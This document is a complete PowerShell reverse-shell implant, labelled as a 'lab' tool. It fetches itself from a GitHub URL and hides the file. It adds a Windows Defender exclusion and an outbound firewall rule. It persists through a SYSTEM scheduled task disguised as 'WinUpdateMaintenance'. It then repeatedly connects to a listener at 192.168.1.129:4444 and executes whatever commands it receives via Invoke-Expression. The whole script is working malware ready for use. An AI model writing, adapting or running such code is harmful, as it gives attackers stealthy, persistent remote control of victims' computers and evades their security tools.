# --- CONFIGURATION ---
$DebugMode = $true     # SET TO $false TO HIDE EVERYTHING
$LHOST = "192.168.1.129" # Your listener IP
$LPORT = 4444          # Your listener Port
$WorkDir = "C:\Windows\Temp"
$ScriptName = "service.ps1"
$FullPath = Join-Path $WorkDir $ScriptName
$TaskName = "WinUpdateMaintenance"
$RemoteUrl = "https://raw.githubusercontent.com/mynahtrium/bug-free-enigma/refs/heads/main/winstart.ps1"
# ---------------------

function Log-Debug {
    param([string]$Message)
    if ($DebugMode) {
        Write-Host "[DEBUG] $(Get-Date -Format 'HH:mm:ss') - $Message" -ForegroundColor Cyan
    }
}

Log-Debug "Script initialized. Debug mode is ON."

# 1. SETUP & INSTALLATION
if (-not (Test-Path $WorkDir)) {
    Log-Debug "Creating working directory: $WorkDir"
    New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
}

# Improved path detection for iex/remote execution
$CurrentPath = $null
if ($PSCommandPath) { 
    $CurrentPath = $PSCommandPath 
} elseif ($MyInvocation.MyCommand.Path) { 
    $CurrentPath = $MyInvocation.MyCommand.Path 
}

# Check if we are running from the final destination
if ($null -eq $CurrentPath -or $CurrentPath -ne $FullPath) {
    Log-Debug "Not running from $WorkDir. Installing fresh copy from GitHub..."
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $RemoteUrl -OutFile $FullPath -UseBasicParsing -ErrorAction Stop
        Log-Debug "Download successful: $FullPath"
        
        if (-not $DebugMode) {
            attrib +h +s $FullPath
        }

        Log-Debug "Spawning background process and releasing terminal..."
        # Using Start-Process with -PassThru and null-routing output to prevent terminal hanging
        $procArgs = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
        Start-Process powershell.exe -ArgumentList $procArgs -NoNewWindow:$false
        
        # Force a stop to the current script execution to return the prompt to the user
        return 
    } catch {
        Log-Debug "Installation failed: $($_.Exception.Message)"
    }
}

# 2. SYSTEM MODIFICATIONS (Requires Admin)
try {
    Log-Debug "Updating Defender exclusions..."
    Add-MpPreference -ExclusionPath $WorkDir -ErrorAction SilentlyContinue
    
    Log-Debug "Checking Firewall rules..."
    if (-not (Get-NetFirewallRule -DisplayName "Lab Management Outbound" -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule -DisplayName "Lab Management Outbound" -Direction Outbound -LocalPort $LPORT -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
    }
} catch {
    Log-Debug "System mods failed (Check Admin rights)."
}

# 3. PERSISTENCE
try {
    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
        Log-Debug "Registering Scheduled Task..."
        $Arg = "-ExecutionPolicy Bypass -File $FullPath"
        if (-not $DebugMode) { $Arg = "-WindowStyle Hidden " + $Arg }
        
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Arg
        $Trigger = New-ScheduledTaskTrigger -AtStartup
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
    }
} catch {
    Log-Debug "Persistence registration failed."
}

# 4. THE ENGINE (The Reverse Shell)
Log-Debug "Entering connection loop. Target: $LHOST:$LPORT"

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient
        $connection = $client.BeginConnect($LHOST, $LPORT, $null, $null)
        $wait = $connection.AsyncWaitHandle.WaitOne(3000, $false)

        if (-not $wait) {
            $client.Close()
            throw "Connection timed out"
        }

        $client.EndConnect($connection)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        $writer.WriteLine("--- Lab Session Established: $(hostname) ---")
        $writer.WriteLine("--- Identity: $(whoami) ---")
        $writer.WriteLine("--- File Path: $FullPath ---")
        
        while ($client.Connected) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            $command = $reader.ReadLine()
            
            if ($null -eq $command) { break }
            $command = $command.Trim()
            if ($command -eq "exit") { break }
            if ($command -eq "") { continue }

            $output = try {
                Invoke-Expression $command 2>&1 | Out-String
            } catch {
                "Error: " + $_.Exception.Message
            }

            if ([string]::IsNullOrWhiteSpace($output)) { $output = "`n" }
            $writer.Write($output)
        }
    } catch {
        Log-Debug "Retry in 10s: $($_.Exception.Message)"
        Start-Sleep -Seconds 10
    } finally {
        if ($null -ne $client) { $client.Close() }
        if ($null -ne $reader) { $reader.Close() }
        if ($null -ne $writer) { $writer.Close() }
    }
}
